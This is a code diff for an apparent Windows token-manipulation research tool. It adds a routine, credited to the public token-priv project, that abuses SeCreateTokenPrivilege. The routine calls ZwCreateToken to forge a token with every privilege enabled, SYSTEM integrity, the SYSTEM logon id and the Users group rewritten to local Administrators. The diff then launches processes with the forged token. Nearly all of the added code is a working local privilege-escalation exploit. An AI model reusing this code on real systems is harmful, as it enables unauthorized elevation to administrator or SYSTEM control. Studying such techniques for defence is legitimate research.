@@ -174,6 +174,7 @@ int printAccessTokenInfo(HANDLE hAccessToken)
 		write2File(hFile, L"\t\tprivilegeName=%ls ", privilegeName);
 		
 		WCHAR* state = L"Disabled";
+		write2File(hFile, L"(%d) ", tokenPrivileges->Privileges[i].Attributes);
 		switch (tokenPrivileges->Privileges[i].Attributes) {
 		  case SE_PRIVILEGE_ENABLED:
 			state = L"Enabled";
@@ -447,6 +448,294 @@ int printCreateProcess(HANDLE accessToken, WCHAR* szCmdline)
 	return 0;
 }
 
+void
+get_system_privileges(PTOKEN_PRIVILEGES privileges)
+{
+	//TOKEN_PRIVILEGES privileges;
+	LUID luid;
+
+	privileges->PrivilegeCount = 34;
+
+	win32Api.LookupPrivilegeValueW(NULL, L"SeCreateTokenPrivilege", &luid);
+	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[0].Luid = luid;
+	
+	win32Api.LookupPrivilegeValueW(NULL, L"SeAssignPrimaryTokenPrivilege", &luid);
+	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[1].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeLockMemoryPrivilege", &luid);
+	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[2].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeIncreaseQuotaPrivilege", &luid);
+	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[3].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeMachineAccountPrivilege", &luid);
+	privileges->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[4].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeTcbPrivilege", &luid);
+	privileges->Privileges[5].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[5].Luid = luid;
+
+	win32Api.LookupPrivilegeValueW(NULL, L"SeSecurityPrivilege", &luid);
+	privileges->Privileges[6].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[6].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeTakeOwnershipPrivilege", &luid);
+	privileges->Privileges[7].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[7].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeLoadDriverPrivilege", &luid);
+	privileges->Privileges[8].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[8].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeSystemProfilePrivilege", &luid);
+	privileges->Privileges[9].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[9].Luid = luid;
+			
+	win32Api.LookupPrivilegeValueW(NULL, L"SeSystemtimePrivilege", &luid);
+	privileges->Privileges[10].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[10].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeProfileSingleProcessPrivilege", &luid);
+	privileges->Privileges[11].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[11].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeIncreaseBasePriorityPrivilege", &luid);
+	privileges->Privileges[12].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[12].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeCreatePagefilePrivilege", &luid);
+	privileges->Privileges[13].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[13].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeCreatePermanentPrivilege", &luid);
+	privileges->Privileges[14].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[14].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeBackupPrivilege", &luid);
+	privileges->Privileges[15].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[15].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeRestorePrivilege", &luid);
+	privileges->Privileges[16].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[16].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &luid);
+	privileges->Privileges[17].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[17].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid);
+	privileges->Privileges[18].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[18].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeAuditPrivilege", &luid);
+	privileges->Privileges[19].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[19].Luid = luid;
+			
+	win32Api.LookupPrivilegeValueW(NULL, L"SeSystemEnvironmentPrivilege", &luid);
+	privileges->Privileges[20].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[20].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeChangeNotifyPrivilege", &luid);
+	privileges->Privileges[21].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[21].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeRemoteShutdownPrivilege", &luid);
+	privileges->Privileges[22].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[22].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeUndockPrivilege", &luid);
+	privileges->Privileges[23].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[23].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeSyncAgentPrivilege", &luid);
+	privileges->Privileges[24].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[24].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeEnableDelegationPrivilege", &luid);
+	privileges->Privileges[25].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[25].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeManageVolumePrivilege", &luid);
+	privileges->Privileges[26].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[26].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeImpersonatePrivilege", &luid);
+	privileges->Privileges[27].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[27].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeCreateGlobalPrivilege", &luid);
+	privileges->Privileges[28].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[28].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeTrustedCredManAccessPrivilege", &luid);
+	privileges->Privileges[29].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[29].Luid = luid;
+
+	//ok
+			
+	win32Api.LookupPrivilegeValueW(NULL, L"SeRelabelPrivilege", &luid);
+	privileges->Privileges[30].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[30].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeIncreaseWorkingSetPrivilege", &luid);
+	privileges->Privileges[31].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[31].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeTimeZonePrivilege", &luid);
+	privileges->Privileges[32].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[32].Luid = luid;
+		
+	win32Api.LookupPrivilegeValueW(NULL, L"SeCreateSymbolicLinkPrivilege", &luid);
+	privileges->Privileges[33].Attributes = SE_PRIVILEGE_ENABLED;
+	privileges->Privileges[33].Luid = luid;
+	
+	// nok:	
+	// win32Api.LookupPrivilegeValueW(NULL, L"SeUnsolicitedInputPrivilege", &luid);
+	// privileges->Privileges[34].Attributes = SE_PRIVILEGE_ENABLED;
+	// privileges->Privileges[34].Luid = luid;	
+}
+
+PVOID
+GetInfoFromToken(HANDLE current_token, TOKEN_INFORMATION_CLASS tic)
+{
+	DWORD n;
+	PVOID data;
+
+	if (!win32Api.GetTokenInformation(current_token, tic, 0, 0, &n) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+		return 0;
+
+	data = (PVOID)malloc(n);
+
+	if (win32Api.GetTokenInformation(current_token, tic, data, n, &n))
+		return data;
+	else
+		free(data);
+
+	return 0;
+}
+
+// see https://github.com/hatRiot/token-priv/blob/master/poptoke/poptoke/SeCreateTokenPrivilege.cpp
+HANDLE
+se_create_token_privilege(HANDLE base_token, BOOL isPrimary)
+{
+	LUID luid;
+	PLUID pluidAuth;
+	NTSTATUS ntStatus;
+	LARGE_INTEGER li;
+	PLARGE_INTEGER pli;
+	DWORD sessionId;
+	_TOKEN_TYPE token_type = isPrimary ? TokenPrimary : TokenImpersonation;
+
+	HANDLE elevated_token;
+	PTOKEN_STATISTICS stats;
+	PTOKEN_PRIVILEGES privileges;
+	PTOKEN_OWNER owner;
+	PTOKEN_PRIMARY_GROUP primary_group;
+	PTOKEN_DEFAULT_DACL default_dacl;
+	PTOKEN_GROUPS groups;
+	SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
+	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
+	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
+	PSID_AND_ATTRIBUTES pSid;
+	PISID pSidSingle;
+	TOKEN_USER userToken;
+	TOKEN_SOURCE sourceToken = { { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };
+	PSID lpSidOwner = NULL;
+	LUID authid = SYSTEM_LUID;
+
+	SID_BUILTIN TkSidLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, DOMAIN_ALIAS_RID_ADMINS } };
+	SID_INTEGRITY IntegritySIDHigh = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_HIGH_RID };
+	SID_INTEGRITY IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };
+	SID_INTEGRITY IntegritySIDMedium = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };
+
+	if (win32Api.ZwCreateToken == NULL){
+		write2File(hFile,L"[-] Failed to load ZwCreateToken: %d\n", GetLastError());
+		return NULL;
+	}
+
+	DWORD dwBufferSize = 0;
+	PTOKEN_USER user;
+	user = (PTOKEN_USER)GetInfoFromToken(base_token, TokenUser);
+
+	win32Api.AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
+		0, 0, 0, 0, 0, 0, 0, &lpSidOwner);
+
+	userToken.User.Sid = lpSidOwner;
+	userToken.User.Attributes = 0;
+
+	win32Api.AllocateLocallyUniqueId(&luid);
+	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
+	sourceToken.SourceIdentifier.HighPart = luid.HighPart;
+
+	stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
+	privileges = (PTOKEN_PRIVILEGES)win32Api.LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 35));
+	get_system_privileges(privileges);
+	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
+	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
+	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);
+
+	pSid = groups->Groups;
+	for (int i = 0; i < groups->GroupCount; ++i, pSid++)
+	{
+		// change IL
+		if (pSid->Attributes & SE_GROUP_INTEGRITY)
+			//memcpy(pSid->Sid, &IntegritySIDMedium, sizeof(IntegritySIDMedium));
+			memcpy(pSid->Sid, &IntegritySIDSystem, sizeof(IntegritySIDSystem));
+
+		PISID piSid = (PISID)pSid->Sid;
+		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS){
+			// found RID_USERS membership, overwrite with RID_ADMINS
+			memcpy(piSid, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));
+			pSid->Attributes = SE_GROUP_ENABLED;
+		}
+		else {
+			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
+			pSid->Attributes &= ~SE_GROUP_ENABLED;
+		}
+	}
+
+	owner = (PTOKEN_OWNER)win32Api.LocalAlloc(LPTR, sizeof(PSID));
+	owner->Owner = user->User.Sid;
+	//owner->Owner = GetLocalSystemSID();
+
+	pluidAuth = &authid;
+	li.LowPart = 0xFFFFFFFF;
+	li.HighPart = 0xFFFFFFFF;
+	pli = &li;
+	ntStatus = win32Api.ZwCreateToken(&elevated_token,
+		TOKEN_ALL_ACCESS,
+		&oa,
+		token_type,
+		pluidAuth,
+		pli,
+		user,
+		//&userToken,
+		groups,
+		privileges,
+		owner,
+		primary_group,
+		default_dacl,
+		&sourceToken // creates an anonymous impersonation token
+		);
+
+	if (ntStatus == STATUS_SUCCESS)
+		return elevated_token;
+	else
+		write2File(hFile,L"[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);
+
+	win32Api.FreeSid(lpSidOwner);
+	if (stats) win32Api.LocalFree(stats);
+	if (groups) win32Api.LocalFree(groups);
+	if (privileges) win32Api.LocalFree(privileges);
+	return NULL;
+}
+
+
 int test(BOOL isService)
 {
 	write2File(hFile, L"win32Api.m_Kernelbase=0x%08X\n", win32Api.m_Kernelbase);
@@ -580,16 +869,20 @@ int test(BOOL isService)
 		SetPrivilege(dupSystemToken, L"SeUndockPrivilege", TRUE);
 		SetPrivilege(dupSystemToken, L"SeManageVolumePrivilege", TRUE);
 		SetPrivilege(dupSystemToken, L"SeManageVolumePrivilege", TRUE);
-		write2File(hFile, L"************ dupSystemToken=0x%08X information:\n", dupSystemToken);
+		write2File(hFile, L"************ updated dupSystemToken=0x%08X information:\n", dupSystemToken);
 		printAccessTokenInfo(dupSystemToken);
-
-		WCHAR szCmdline1[]=L"C:\\windows\\system32\\WPR.EXE -start CPU.light -filemode";
-		//printCreateProcess(defappsLogonToken, szCmdline1);
-		
-		WCHAR szCmdline2[]=L"C:\\windows\\system32\\WPR.EXE -stop C:\\Data\\USERS\\Public\\Documents\\wpr.etl";
-		//printCreateProcess(defappsLogonToken, szCmdline2);
 		
 		//https://github.com/hatRiot/token-priv/blob/master/poptoke/poptoke/SeCreateTokenPrivilege.cpp
+		write2File(hFile, L"se_create_token_privilege....\n");
+		HANDLE createdToken = se_create_token_privilege(hCurrentProcessToken, TRUE);
+		write2File(hFile, L"************ createdToken=0x%08X information:\n", createdToken);
+		printAccessTokenInfo(createdToken);
+		
+		WCHAR szCmdline1[]=L"C:\\windows\\system32\\WPR.EXE -start CPU.light -filemode";
+		printCreateProcess(createdToken, szCmdline1);
+		
+		WCHAR szCmdline2[]=L"C:\\windows\\system32\\WPR.EXE -stop C:\\Data\\USERS\\Public\\Documents\\wpr.etl";
+		printCreateProcess(createdToken, szCmdline2);
 	}
 
     return 0;
